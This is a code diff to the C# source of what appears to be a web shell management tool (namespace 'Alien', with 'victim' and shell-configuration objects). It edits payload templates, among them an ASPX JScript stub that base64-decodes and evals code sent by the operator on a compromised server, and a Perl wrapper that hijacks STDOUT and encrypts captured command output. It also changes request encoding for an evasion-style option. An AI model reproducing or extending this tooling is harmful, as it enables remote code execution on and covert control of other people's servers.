@@ -22,7 +22,7 @@ namespace Alien
         private bool _disposed;
 
         public clsVictim m_victim { get; init; }
-        public clsTamper m_tamper { get; init; }
+        public clsTamper m_tamper { get; set; }
         public HttpClient m_clnt { get; set; }
 
         private AesGcm m_aesgcm { get; set; }
@@ -211,7 +211,7 @@ namespace Alien
                 enLanguage.ASPX, (type) =>
                 {
                     if (type == "JScript")
-                        return @"var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(""[PATTERN]"")),""unsafe"");}catch(err){Response.Write(""ERROR://""+err.message);}Response.End();";
+                        return @"var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(""[PATTERN]"")),""unsafe"");}catch(err){Response.Write(""ERROR://""+err.message);}";
                     else if (type == "CSharp")
                         return string.Empty;
 
@@ -615,7 +615,7 @@ namespace Alien
                     content = new StringContent(
                         szPayloadData,
                         Encoding.GetEncoding(m_victim.ShellEncoding),
-                        "application/x-www-form-urlencoded"
+                        m_victim.m_ShellConfig.bWHEnable ? "text/plain" : "application/x-www-form-urlencoded"
                     );
                 }
 
@@ -1048,7 +1048,7 @@ namespace Alien
                         if (string.IsNullOrEmpty(szEncryptor))
                             szEncryptor = string.Empty;
 
-                        MessageBox.Show(szEncryptor);
+                        
                     }
 
                     string szMethod = m_victim.m_ShellConfig.szMethod;
@@ -1267,14 +1267,16 @@ namespace Alien
                 (string.IsNullOrEmpty(szEncryptor) ?
                 "sub Encrypt {\r\n" +
                 "    my ($data) = @_;\r\n" +
-                "    # TODO: Add Perl encryption logic here\r\n" +
                 "    return $data;\r\n" +
                 "}" : szEncryptor) + "\r\n\r\n" +
-                "# Setup memory buffer to hijack STDOUT\r\n" +
                 "my $globalStringOutput = '';\r\n" +
-                "open(my $oldout, '>&', STDOUT);\r\n" +
-                "close(STDOUT);\r\n" +
-                "open(STDOUT, '>', \\$globalStringOutput);\r\n\r\n";
+                "my $oldout;\r\n" +
+                "sub start_capture {\r\n" +
+                "    open($oldout, '>&', STDOUT);\r\n" +
+                "    close(STDOUT);\r\n" +
+                "    open(STDOUT, '>', \\$globalStringOutput);\r\n" +
+                "}\r\n\r\n" +
+                "start_capture();\r\n";
 
             string szFooter =
                 "\r\n\r\n" +
@@ -1283,7 +1285,7 @@ namespace Alien
                 "open(STDOUT, '>&', $oldout);\r\n" +
                 "print Encrypt($globalStringOutput);\r\n";
 
-            return $"{szHeader}{szProcessed}{szFooter}";
+            return szHeader + szProcessed + szFooter;
         }
 
         private static string fnWrapRuby(string szOriginalPayload, string szEncryptor)
